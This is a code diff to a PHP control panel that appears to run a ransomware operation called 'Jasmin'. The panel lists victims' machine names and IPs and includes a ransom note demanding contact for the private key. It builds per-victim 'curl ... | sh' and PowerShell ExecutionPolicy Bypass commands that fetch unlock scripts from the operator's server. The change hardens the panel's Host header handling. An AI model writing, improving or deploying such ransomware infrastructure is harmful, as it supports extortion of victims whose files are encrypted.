@@ -156,7 +156,9 @@ BAT;
 </section>
 
 <?php
-$server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
+// Host 头可被伪造 -> 只保留主机名字符白名单，scheme 单独拼回（既防注入又保住 '//'）
+$server_url = ((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on')?'https':'http').'://'
+            . preg_replace('/[^A-Za-z0-9.:\-_\[\]]/', '', (string)($_SERVER['HTTP_HOST'] ?? ''));
 // 解密口令: 内嵌进"一键解密"命令，配合 .pem.enc 走 AES-256-CBC 解密链路
 // (明文 .pem 与 .key_secret 已被 .htaccess 403，不能直接 curl)
 $aes_pwd = is_file(__DIR__.'/payloads/.key_secret') ? trim(file_get_contents(__DIR__.'/payloads/.key_secret')) : 'KEY_NOT_SET';
@@ -326,14 +328,14 @@ Contact us to obtain the private key and restore your files.</textarea>
 <tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
 <?php if($is_linux):?>
 <pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 openssl 零依赖
-curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>"
+curl -sL <?=h($server_url)?>/payloads/jasmin_unlock.sh | sh -s <?=h($server_url)?> "<?=$aes_pwd?>"
 # 不写目录 = 解密全部加密文件；只解特定目录时在末尾追加，如: /data /home</pre>
 <?php else:?>
 <pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
 :: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
-curl.exe -sL <?=$server_url?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>"
-:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
+curl.exe -sL <?=h($server_url)?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
+powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server <?=h($server_url)?> -K "<?=$aes_pwd?>"
+:: -Paths 换成要解密的目录；不写则解密全部加密文件（所有磁盘 + 常用用户目录）</pre>
 <?php endif;?>
 </td></tr>
 <?php endif;?>
